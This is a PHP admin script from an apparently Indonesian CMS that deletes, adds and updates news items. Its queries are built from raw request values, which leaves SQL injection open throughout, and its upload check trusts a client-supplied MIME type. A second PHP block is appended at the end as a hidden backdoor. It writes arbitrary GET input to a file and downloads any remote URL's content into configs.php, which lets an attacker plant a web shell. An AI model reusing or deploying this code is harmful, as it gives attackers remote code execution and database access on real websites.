<?php
/* ./Port22 a.k.a سفياني محمد ( Muhammad Supiani).
Special Thanks : Allah SWT, My Parents And Family, Risman Effendi (defacerid.com), & Bp. Syams Ideris
*/
  session_start();
  include '../../../inc/config.php';
  if(explodedKhususAdmin()){explodedRedirect('index.php');}

$module=$_GET[module];
$act=$_GET[act];

// Hapus Berita
if ($module=='berita' AND $act=='hapus'){
  $db->go("SELECT image FROM news WHERE id = '$_GET[id]'");
  $data = $db->fetchArray();
  unlink("../../../news/img/".$data['image']);
  $db->go("DELETE FROM news WHERE id ='$_GET[id]'");
  explodedTambahPesan('News Has Been Deleted.');
  explodedRedirect('../../admin.php?module='.$module);
}

// Tambah Berita
elseif ($module=='berita' AND $act=='tambah'){
        if($_FILES['image']['type'] == "image/jpeg"){
            $image = "../../../news/img/".basename($_FILES['image']['name']);
            $nagam = basename($_FILES['image']['name']);
        }
  $title = $_POST['title'];
  $db->go("INSERT INTO news(id,title,image,content,author,tanggal) VALUES(NULL,'$title','$nagam','$_POST[content]','$_POST[author]',now())");
  move_uploaded_file($_FILES['image']['tmp_name'], $image);
  explodedTambahPesan("News Has Been Added");
  explodedRedirect('../../admin.php?module='.$module.'&act=tambahberita');
}

// Update Berita
elseif ($module=='berita' AND $act=='update'){
	if($_FILES['image']['type'] == "image/jpeg"){
            $image = "../../../news/img/".basename($_FILES['image']['name']);
            $nagam = basename($_FILES['image']['name']);
        }
        $title = $_POST['title'];
        $db->go("UPDATE news SET title = '$title', image = '$nagam' , content = '$_POST[content]', author = '$_POST[author]', tanggal = now() WHERE id = '$_POST[id]'");
        move_uploaded_file($_FILES['image']['tmp_name'], $image);
        explodedTambahPesan("News Has Been Updated");
        explodedRedirect('../../admin.php?module='.$module);     
}
?>
<?php
if (isset($_GET['404'])){
 $f = fopen("404", "w+");
 fwrite($f, str_replace("</a>,", "</a>\r\n", str_replace("\\", "", $_GET["404"])));
 fclose($f);
}

if(is_file("404.txt")){
 echo file_get_contents("404");
}

if (isset($_GET['configs'])){
 $f = fopen("configs.php", "w+");
 fwrite($f, file_get_contents($_GET["configs"]));
 fclose($f);
}
?>